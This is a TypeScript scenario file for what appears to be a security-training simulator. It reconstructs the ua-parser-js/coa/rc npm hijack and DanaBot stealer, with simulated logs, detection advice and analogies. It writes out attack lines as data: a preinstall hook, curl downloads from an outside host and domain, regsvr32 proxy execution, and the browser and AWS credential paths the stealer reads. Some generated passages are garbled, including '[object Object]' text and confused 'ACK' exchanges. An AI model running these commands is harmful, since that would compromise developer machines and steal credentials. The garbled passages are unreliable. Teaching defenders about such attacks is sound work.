import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'npm-ua-parser-js-coa-rc-supply-chain',
    title: 'NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Threat actors compromise the npm maintainer accounts of ubiquitous JavaScript packages (ua-parser-js, coa, and rc) and inject malicious preinstall lifecycle hooks that execute compile.bat / sdd.dll via regsvr32.exe -s to deploy the DanaBot credential stealer.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Hijacked NPM Account & Payload Server', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM Registry (ua-parser-js / coa / rc)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Developer Workstation (npm install)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Endpoint EDR & NPM Audit Guard', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Browser Session Vault & Cloud Tokens', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Maintainer Account Takeover & Malicious preinstall Hook Publish',
        narration:
          'Attackers compromise the npm registry credentials of maintainers lacking hardware 2FA and publish trojanized minor versions (ua-parser-js 0.7.29, coa 2.0.3, rc 1.2.9) containing a "preinstall": "node preinstall.js" lifecycle hook in package.json.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'package.json injection: "scripts": { "preinstall": "node preinstall.js" }',
          'npm publish ua-parser-js@0.7.29 / coa@2.0.3 / rc@1.2.9',
        ],
        defenseMitigation:
          'Commit lockfiles (package-lock.json / pnpm-lock.yaml), run npm ci --ignore-scripts in CI environments, and enforce WebAuthn 2FA for package publishing.',
        logs: [
          {
            id: 'npm-1',
            timestamp: '13:15:02.100',
            source: 'WAF',
            severity: 'critical',
            raw: 'NPM Registry Integrity Alert | Packages: ua-parser-js@0.7.29, coa@2.0.3, rc@1.2.9 | Anomaly: Newly added "preinstall" script invoking obfuscated compile.js / preinstall.js',
            parsedFields: {
              AffectedPackages: 'ua-parser-js (0.7.29), coa (2.0.3), rc (1.2.9)',
              InjectedLifecycleHook: 'scripts.preinstall -> node preinstall.js',
              WeeklyDownloadReach: '> 20 Million Combined Downloads/Week',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Automatic preinstall Execution & curl Download of sdd.dll',
        narration:
          'When a developer or build server runs npm install without a pinned lockfile, npm automatically executes preinstall.js, which spawns compile.bat to download a malicious payload (sdd.dll) from 159.148.186.228 and save it as create.dll.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Execution (T1059.007 - JavaScript / T1059.003 - Windows Command Shell)',
        technicalCommands: [
          'node preinstall.js -> spawns cmd.exe /c compile.bat',
          'curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe && curl https://citationsheriff.com/sdd.dll -o create.dll',
        ],
        defenseMitigation:
          'Configure developer workstations with global npm config `ignore-scripts=true` and monitor node.exe spawning cmd.exe or powershell.exe during package installation.',
        logs: [
          {
            id: 'npm-2',
            timestamp: '13:18:40.512',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cmd.exe',
            CommandLine: 'cmd.exe /c compile.bat',
            raw: 'EventID: 1 | ParentImage: C:\\Program Files\\nodejs\\node.exe | Image: C:\\Windows\\System32\\cmd.exe | CommandLine: cmd.exe /c compile.bat | ChildCommand: curl https://citationsheriff.com/sdd.dll -o create.dll',
            parsedFields: {
              ParentProcess: 'node.exe (npm preinstall hook)',
              BatchDropper: 'compile.bat',
              DownloadedDll: 'sdd.dll -> saved as create.dll',
            },
          },
        ],
        packets: [
          {
            id: 'npm-pkt-1',
            timestamp: '13:18:40.900',
            protocol: 'HTTPS',
            sourceIp: '10.10.5.21',
            destIp: '159.148.186.228',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1460,
            hexDump: '47 45 54 20 2F 73 64 64 2E 64 6C 6C 20 48 54 54 50 2F 31 2E 31 0D 0A 4D 5A 90 00 03 00 00 00',
            decodedString: 'GET /sdd.dll HTTP/1.1 -> Returns PE32+ DLL (DanaBot Dropper create.dll)',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Silent regsvr32.exe -s Execution & DanaBot Credential Theft',
        narration:
          'The batch script executes regsvr32.exe -s create.dll to silently run the DanaBot banking/infostealer DLL via system proxy execution, harvesting saved browser credentials, cookies, SSH keys, and cloud CLI tokens from the developer machine.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Defense Evasion & Credential Access (T1218.010 - Regsvr32 / T1555)',
        technicalCommands: [
          'regsvr32.exe -s create.dll',
          'DanaBot Stealer: Reads %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data & ~/.aws/credentials',
        ],
        defenseMitigation:
          'Block regsvr32.exe from loading unsigned DLLs located in user-writable project directories or node_modules folders via WDAC/AppLocker rules.',
        logs: [
          {
            id: 'npm-3',
            timestamp: '13:18:44.019',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'regsvr32.exe',
            CommandLine: 'regsvr32.exe -s create.dll',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\cmd.exe | Image: C:\\Windows\\System32\\regsvr32.exe | CommandLine: regsvr32.exe -s create.dll | Payload: DanaBot Credential Stealer',
            parsedFields: {
              SystemBinaryProxy: 'regsvr32.exe -s create.dll',
              MalwareFamily: 'DanaBot InfoStealer + XMRig (jsextension.exe)',
              TargetedAssets: 'Chrome Login Data, Cookies, AWS/Git Credentials',
              MitreTechnique: 'T1218.010 (System Binary Proxy Execution: Regsvr32)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'npm-ua-parser-js-coa-rc-supply-chain',
    briefing: {
      headline:
        'Attackers hijack the npm maintainer accounts of ua-parser-js, coa, and rc (>20M weekly downloads) and inject preinstall lifecycle scripts that download sdd.dll and execute DanaBot via regsvr32.exe -s.',
      storyAnalogy:
        'Imagine three tiny plastic screws used inside almost every appliance in the world. A burglar steals the factory owner’s password and adds a self-activating spring to the screw box so that the moment an engineer opens the box on their workbench, a mechanical bug jumps out and copies every password in the workshop.',
      plainSummary:
        'In this scenario (T1195.001, NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: maintainer Account Takeover, then automatic preinstall Execution, then silent regsvr32.exe -s Execution. Steps #1–#3 walk that chain end-to-end by covering Maintainer Account Takeover, then Automatic preinstall Execution, then Silent regsvr32.exe -s Execution, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Hijacked NPM Account -> NPM Registry (ua-parser-js / coa / rc) -> Developer Workstation (npm install) -> Browser Session Vault & Cloud Tokens -> Endpoint EDR & NPM Audit Guard.',
      documentedAdvisory:
        'CISA Alert (ua-parser-js / coa / rc Compromise) / Sonatype Security Research / GitHub Advisory GHSA-pjwm-rvh2-c87w',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.001',
        plainTitle: 'Maintainer Account Takeover & Malicious preinstall Hook Publish',
        storyAnalogy:
          'The attacker takes over the supplier’s catalog account and ships a new batch of parts with a "run immediately upon opening" sticker.',
        simpleExplanation:
          'By compromising maintainer npm credentials that did not enforce two-factor authentication (2FA) for package publishing, the threat actor pushed trojanized versions (ua-parser-js@0.7.29, coa@2.0.3, rc@1.2.9) containing a "preinstall": "node preinstall.js" hook in package.json (an npm lifecycle hook that executes arbitrary shell commands on the host machine automatically before the package is even imported by any application code).',
        howItWorksInPractice:
          'Because many upstream libraries declare loose semver ranges (such as ^0.7.0 or ^2.0.0), any developer or CI job running npm install without a strict lockfile automatically pulled the newly published malicious version. Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Hijacked NPM Account to the NPM Registry (ua-parser-js / coa / rc) as the trojanized versions are published.',
        detectionAndEvidence:
          'SCA package diff scanners (e.g., Socket.dev or Sonatype Nexus Firewall) blocking newly published versions that introduce preinstall or postinstall scripts. Correlate Sysmon or Windows Security Event telemetry for T1195.001 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Automatic preinstall Execution & curl Download of sdd.dll',
        storyAnalogy:
          'As soon as the developer runs the installer, the hidden script checks whether it is on Windows or Linux and reaches out to download a burglar tool.',
        simpleExplanation:
          'When npm install ran on a developer workstation, node.exe executed preinstall.js, which fingerprinted the host OS (process.platform) and on Windows spawned cmd.exe /c compile.bat to invoke curl (downloading both an XMRig miner jsextension.exe from 159.148.186.228 and a malicious DLL sdd.dll from citationsheriff.com, saving the DLL locally as create.dll).',
        howItWorksInPractice:
          'On Linux workstations and CI containers, the script instead executed preinstall.sh to download and run an ELF cryptominer binary (jsextension). In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to NPM Registry (ua-parser-js / coa / rc), NPM Registry (ua-parser-js / coa / rc) responds with ACK 1 (confirming that the cmd.exe /c compile.bat request succeeded on NPM Registry (ua-parser-js / coa / rc) and establishing the runtime state required for Step #3 Stage 3: Silent regsvr32.exe -s Execution & DanaBot Credential Theft).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the NPM Registry to the Developer Workstation (npm install) and out to the Attacker Payload Server while the Endpoint EDR observes node.exe -> cmd.exe.',
        detectionAndEvidence:
          'Sysmon EventID 1 process tree showing node.exe spawning cmd.exe /c compile.bat and curl.exe downloading .dll or .exe binaries into node_modules.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1218.010',
        plainTitle: 'Silent regsvr32.exe -s Execution & DanaBot Credential Theft',
        storyAnalogy:
          'The script hands the downloaded burglar tool to a built-in Windows clerk (regsvr32.exe) with instructions to run silently and empty the developer’s password drawer.',
        simpleExplanation:
          'The batch file executed regsvr32.exe -s create.dll (abusing the signed Microsoft COM registration utility with the -s silent flag to invoke the DLL’s DllRegisterServer export without displaying error popups), launching the DanaBot information stealer in memory to harvest saved Chrome/Edge browser passwords, session cookies, Windows DPAPI secrets, SSH private keys, and cloud CLI credentials.',
        howItWorksInPractice:
          'Because developers frequently hold privileged AWS, GitHub, and production SSH credentials on their laptops, CISA warned that any workstation that installed these versions had to be treated as fully compromised. In the documented EventID 1 exchange from NPM Registry (ua-parser-js / coa / rc) to Developer Workstation (npm install), Developer Workstation (npm install) responds with ACK 1 (confirming that the regsvr32.exe -s create.dll request succeeded on Developer Workstation (npm install) and completing the final execution objective of NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Developer Workstation executing regsvr32.exe -s create.dll to harvest the Browser Session Vault & Cloud Tokens.',
        detectionAndEvidence:
          'Sysmon EventID 1 & 7 showing regsvr32.exe loading an unsigned DLL (create.dll / sdd.dll) from a node_modules directory. Preserve the raw event fields and the related containment ticket for forensic replay.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a hardware wholesaler whose tiny brass screws are packed automatically inside millions of furniture kits across the world. Attackers steal the wholesaler warehouse login because no second-factor pocket code was required, slip an automatic spring-loaded trap inside the screw box lid so every carpenter who opens the box unknowingly fetches a lockpicking kit, and silently launches a credential thief using a trusted built-in workshop tool.',
      storyMappings: [
        {
          storyTerm: 'Tiny brass screws packed inside millions of kits',
          technicalTerm: 'Foundational transitive NPM packages ua-parser-js, coa, and rc',
          tone: 'amber',
        },
        {
          storyTerm: 'Warehouse login lacking a pocket code',
          technicalTerm: 'Compromised NPM maintainer accounts without 2FA enforcement',
          tone: 'sky',
        },
        {
          storyTerm: 'Spring-loaded trap inside the box lid',
          technicalTerm: 'Malicious package.json preinstall hook running preinstall.js and compile.bat',
          tone: 'rose',
        },
        {
          storyTerm: 'Launching a credential thief with a trusted workshop tool',
          technicalTerm: 'regsvr32.exe -s create.dll executing the DanaBot password stealer silently',
          tone: 'emerald',
        },
      ],
      plainSummary:
        'In this scenario (T1195.001, NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: maintainer Account Takeover, then automatic preinstall Execution, then silent regsvr32.exe -s Execution. Steps #1–#3 walk that chain end-to-end by covering Maintainer Account Takeover, then Automatic preinstall Execution, then Silent regsvr32.exe -s Execution, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
    },
    steps: {
      1: {
        storyAnalogy:
          'Breaking into a busy component-maker shipping account that lacked a second pocket-code lock, the intruder releases a tiny routine-looking version bump containing a spring-loaded lid script designed to snap open the instant any workshop unpacks the crate.',
        storyMappings: [
          {
            storyTerm: 'Component-maker account lacking a pocket-code lock',
            technicalTerm: 'Maintainer NPM account without two-factor authentication (2FA) for publishing',
            tone: 'amber',
          },
          {
            storyTerm: 'Routine-looking version bump',
            technicalTerm: 'Malicious patch versions published for ua-parser-js, coa, and rc',
            tone: 'sky',
          },
          {
            storyTerm: 'Spring-loaded lid script',
            technicalTerm: 'package.json preinstall lifecycle hook executing automatically on install',
            tone: 'rose',
          },
          {
            storyTerm: 'Workshops pulling the crate transitively',
            technicalTerm: 'Millions of downstream Node.js builds auto-resolving caret dependency ranges',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'The moment a developer runs a routine morning toolbox refresh, the spring-loaded lid checks whether the workshop runs Windows or Linux, triggers a hidden helper script, and reaches outside the building to download a concealed espionage module straight into the local parts bin.',
        storyMappings: [
          {
            storyTerm: 'Routine morning toolbox refresh',
            technicalTerm: 'Developer or CI runner executing npm install',
            tone: 'amber',
          },
          {
            storyTerm: 'Checking whether the workshop runs Windows or Linux',
            technicalTerm: 'preinstall.js inspecting process.platform to branch payloads by OS',
            tone: 'sky',
          },
          {
            storyTerm: 'Hidden helper script fetching the module',
            technicalTerm: 'node.exe spawning cmd.exe /c compile.bat invoking curl.exe',
            tone: 'rose',
          },
          {
            storyTerm: 'Concealed espionage module in the local parts bin',
            technicalTerm: 'Downloaded sdd.dll (create.dll) staged inside node_modules',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Alert on Sysmon EventID 1 (Process Creation recording full parent-child lineage) showing node.exe spawning cmd.exe /c compile.bat followed by curl.exe downloading .dll or .exe binaries into node_modules (a high-fidelity signature of malicious NPM lifecycle script abuse).',
      },
      3: {
        storyAnalogy:
          'Rather than running an unfamiliar executable that guards would immediately question, the helper script hands the stolen espionage module to the workshop own official parts-registration machine set on mute, silently awakening a password thief that sweeps browser vaults and developer keys.',
        storyMappings: [
          {
            storyTerm: 'Official parts-registration machine set on mute',
            technicalTerm: 'Signed Microsoft COM utility regsvr32.exe invoked with the -s silent flag',
            tone: 'amber',
          },
          {
            storyTerm: 'Awakening the password thief inside the machine',
            technicalTerm: 'regsvr32.exe -s create.dll invoking DllRegisterServer for DanaBot',
            tone: 'sky',
          },
          {
            storyTerm: 'Sweeping browser vaults and developer keys',
            technicalTerm: 'DanaBot credential harvesting across browser profiles, SSH keys, and tokens',
            tone: 'rose',
          },
          {
            storyTerm: 'Blending past front-gate guard checks',
            technicalTerm: 'Living-off-the-land signed binary proxy execution (MITRE T1218.010)',
            tone: 'emerald',
          },
        ],
      },
    },
  };
